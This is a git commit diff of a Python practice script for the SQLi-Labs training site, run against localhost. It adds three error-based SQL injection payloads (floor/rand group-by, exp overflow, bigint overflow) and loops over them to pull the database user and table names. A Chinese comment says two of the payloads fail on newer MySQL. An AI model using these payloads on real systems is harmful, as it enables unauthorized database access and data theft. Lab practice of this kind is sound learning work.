cc172d2fd1a81c96dda5f93f2ffb0cd59818617b
deidarayu <542317954@qq.com>
2017-05-24 00:28:43 +0800

    update less5-6 baocuo

--- less3.py
+++ less3.py
@@ -9,9 +9,21 @@ from lxml import etree
 url = "http://127.0.0.1/Less-5?id=1\'"
 
 #payload = 'union select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0) *2))a from information_schema.columns group by a --+'
-payload = "union select 1,count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema='security' limit 3,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.tables group by a --+"
+payload_common = "union select 1,count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema='security' limit 3,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.tables group by a --+"
+"""
+不知道是不是5.7.18修了还是怎么样，下面两个payload好像再怎么变，都不行，如果有谁在5.7.18以上测试成功求交流
+"""
+payload_double = "union select (exp(~(select * from (select user())a))),2,3 --+"
+payload_bigint = "union select (!(select * from (select user())x) - ~0),2,3 --+"
+payload = []
+payload.append(payload_common)
+payload.append(payload_double)
+payload.append(payload_bigint)
 
-req = requests.get(url + payload).text
-res = etree.HTML(req)
-result = res.xpath('//font/text()')
-print result
+for i in payload:
+
+    req = requests.get(url + i).text
+
+    res = etree.HTML(req)
+    result = res.xpath('//font/text()')
+    print result
